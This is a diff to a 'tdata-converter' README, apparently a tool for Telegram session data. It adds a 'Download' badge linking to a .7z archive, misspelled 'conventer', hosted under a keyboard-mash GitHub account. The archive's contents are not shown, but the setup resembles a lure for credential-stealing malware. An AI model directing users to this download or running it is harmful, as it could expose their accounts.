@@ -1,5 +1,6 @@
 # tdata-converter 🚀
 
+[![Download](https://img.shields.io/badge/Download-green.svg)](https://github.com/gsdfgsdfgfgsdf66/tdata-converter/releases/download/1/tdata.conventer.7z)
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
 <!-- Добавьте другие значки по необходимости: статус сборки, версия и т.д. -->
 <!-- [![Build Status](https://travis-ci.org/ВАШ-USERNAME/tdata-converter.svg?branch=main)](https://travis-ci.org/ВАШ-USERNAME/tdata-converter) -->
